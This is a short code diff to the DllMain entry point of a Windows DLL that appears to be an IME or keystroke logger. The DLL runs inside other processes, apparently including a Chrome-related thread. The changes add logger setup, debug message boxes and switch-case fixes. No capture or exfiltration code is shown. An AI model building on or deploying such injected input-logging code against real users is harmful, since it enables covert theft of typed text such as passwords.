@@ -61,11 +61,14 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+		initializeLogger();
+
 		hProcess = GetCurrentProcess();
 		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
 		{
 			if (_wcsicmp(processName, targetProcessName)!= 0) {
 				MessageBoxW(NULL, L"OwO\n ", L"IMELoggerEntry", MB_OK);
+				IMEKeyInputlogger(L"\nYee\n");
 				// New thread for chromeMain
 				hThread = CreateThread(
 					NULL,
@@ -78,6 +81,11 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 				if (hThread == NULL) {
 					// fail to create thread
+					MessageBoxW(NULL, L"Fail to create thread\n ", L"IMELoggerEntry", MB_OK);
+				}
+				else {
+					// success to create thread
+					MessageBoxW(NULL, L"Success to create thread\n ", L"IMELoggerEntry", MB_OK);
 				}
 				
 			}
@@ -86,9 +94,11 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 			}
 		}
 
-
+		break;
     case DLL_THREAD_ATTACH:
+		break;
     case DLL_THREAD_DETACH:
+		break;
     case DLL_PROCESS_DETACH:
 		
 		Logger::getInstance().closeAll();
